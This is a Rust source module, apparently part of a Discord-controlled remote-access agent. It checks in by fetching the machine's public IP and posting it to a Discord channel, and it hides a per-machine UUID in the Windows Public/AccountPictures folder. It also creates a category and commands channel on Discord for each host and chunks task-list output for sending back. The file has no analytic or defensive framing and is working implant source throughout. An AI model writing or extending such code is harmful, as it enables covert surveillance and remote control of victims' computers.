use std::{env, fs::{File, create_dir_all}, io::{self, prelude::*}};
use std::collections::HashMap;


use serenity::{client::Context, model::{channel::{ChannelType, Message}, id::{ChannelId, GuildId}}};

use uuid::Uuid;
use reqwest::get;
use anyhow::{anyhow, Error};
use serenity::model::channel::GuildChannel;

use crate::{AGENT_COMMAND_ID, CHANNEL_NAME};


// This function returns a boolean depending on whether the channel ID the message was sent in is the proper channel for sending commands.
pub fn is_designated_channel(msg: &Message) -> Result<bool, String> {

    // AGENT_COMMAND_ID is the static reference to the ChannelId for the "commands" channel.
    let channel_id = match AGENT_COMMAND_ID.read().unwrap().as_ref() {
        Some(id) => id.to_string(), //If we have a value, return it
        None => return Ok(false), // If we don't have a value, return an error (static ref was invalid).
    };

    if msg.channel_id.to_string() == channel_id {
        Ok(true)
    } else {
        Err(String::from("This command can only be used in the designated channel."))
    }
}

// Small helper function to get the IP of our agent and post it to the channel
pub async fn get_agent_ip(ctx: &Context) -> Result<(), Error> {
    let channel_id = AGENT_COMMAND_ID.read().unwrap().or(None);
    let response = get("https://ifconfig.me/").await?;
    let status = response.status();
    let text = response.text().await?;

    // Error handling
    if status.is_client_error() || status.is_server_error() {
        let error_message = text;
        let status_code = status;
        let error = format!("HTTP error {}: {}", status_code, error_message);
        return Err(anyhow!(error));
    }

    // Welcome message
    let message = format!("@everyone AGENT CHECKED IN FROM: {:?}", &text);
    match channel_id {
        Some(id) => {
            id.say(&ctx.http, message).await?;
        }
        None => {
            return Err(anyhow!("AGENT_COMMAND_ID was None, somehow :("));
        }
    }

    Ok(())
}


// Returns the UUID value assigned to this agent (creates & stores if the value does not exist)
pub fn get_or_create_uuid() -> io::Result<Uuid> {
    let pub_dir = env::var("PUBLIC").expect("Public DIR not found, sadly.");
    let file_path = format!(r"{}/AccountPictures/uuid.txt", pub_dir);

    // Check if the file exists
    let mut file = match File::open(&file_path) {
        Ok(f) => {
            println!("Successfully loaded the file");
            f
        }
        Err(ref e) if e.kind() == io::ErrorKind::NotFound => {
            println!("File not found. Attempting to create it");
            // File does not exist, so create the directory and the file
            create_dir_all(format!(r"{}/AccountPictures", pub_dir))?;
            let mut f = File::create(&file_path)?;
            let uuid = Uuid::new_v4();
            write!(f, "{}", uuid)?;
            return Ok(uuid);
        }

        Err(e) => {
            eprintln!("Unknown error occurred sadly");
            return Err(e);
        }
    };

    // Read the file and try to parse the UUID
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;
    match Uuid::parse_str(&contents.trim()) {
        Ok(uuid) => Ok(uuid),
        Err(_) => {
            // File exists but does not contain a valid UUID, so return an error
            Err(io::Error::new(
                io::ErrorKind::InvalidData,
                "Invalid UUID in file",
            ))
        }
    }
}


// Future thinking. Use create_channel to create a new category with the UUID. Allows for creating new "channels" under the UUID category and command contexts, lots to work on there.
pub async fn get_category_uuid(ctx: &Context, guild_id: Option<GuildId>) -> Option<ChannelId> {
    fn get_channel_id_by_name(channels: &HashMap<ChannelId, GuildChannel>, category_id: ChannelId, channel_name: &str) -> Option<ChannelId> {
        let channel_id = channels.iter().find_map(|(channel_id, channel)| {
            if channel.parent_id == Option::from(category_id) && channel.name == channel_name {
                Some(*channel_id)
            } else {
                None
            }
        });
        channel_id
    }

    fn get_category_id(channels: &HashMap<ChannelId, GuildChannel>, id: &String) -> Option<ChannelId> {
        let channel_id = channels.iter().find_map(|(channel_id, channel)| {
            if channel.name == id.to_string() {
                println!("Channel found!");
                Some(*channel_id)
            } else {
                None
            }
        });
        channel_id
    }

// Grab our UUID, set a variable 'channels' which is a HashMap containing the ChannelId and GuildChannel objects.
    let uuid = CHANNEL_NAME.read().unwrap().as_ref().unwrap().to_string();

    let channels = guild_id?.channels(&ctx.http).await.ok()?;
    let category_channel_id = get_category_id(&channels, &uuid);

    async fn create_commands_channel(ctx: &Context, category_id: ChannelId ,guild_id: &GuildId) -> Option<ChannelId> {
        guild_id
            .create_channel(ctx, |c| {
                c.name("commands")
                    .kind(ChannelType::Text)
                    .topic("This is the commands center for your agent. You cannot run agent commands outside of this channel unless specified.")
                    .category(category_id)
            })
            .await
            .ok()
            .map(|channel| {
                *AGENT_COMMAND_ID.write().unwrap() = Some(channel.id);
                channel.id
            })
    }

    async fn create_agent_category(ctx: &Context, guild_id: &GuildId, uuid: &str) -> Option<ChannelId> {
        guild_id
            .create_channel(ctx, |c| c.name(uuid).kind(ChannelType::Category))
            .await
            .ok()
            .map(|category| category.id)
    }

    match category_channel_id {
        Some(id) => {
            let command_channel_id = get_channel_id_by_name(&channels, id, "commands");
            match command_channel_id {
                Some(command_id) => {
                    *AGENT_COMMAND_ID.write().unwrap() = Some(command_id);
                    Some(id)
                },
                None => {
                    let command_id = create_commands_channel(&ctx, id, &guild_id?).await?;
                    Some(id)
                }
            }
        },
        None => {
            println!("Creating agent category");
            let category_id = create_agent_category(&ctx, &guild_id?, &uuid).await;
            if let Some(cid) = category_id {
                let command_id = create_commands_channel(&ctx, cid, &guild_id?).await;
            }
            category_id
        }
    }
}

    pub fn split_tasklist(tasklist: &str, chunk_size: usize) -> Vec<String> {
        let mut chunks = Vec::new();
        let mut start = 0;
        let mut end = chunk_size;

        while start < tasklist.len() {
            if end > tasklist.len() {
                end = tasklist.len();
            }

            let mut chunk = tasklist[start..end].to_string();
            if let Some(last_newline_index) = chunk.rfind('\n') {
                end = start + last_newline_index;
                chunk = tasklist[start..end].to_string();
            }

            chunks.push(chunk);
            start = end + 1;
            end = start + chunk_size;
        }

        chunks
    }
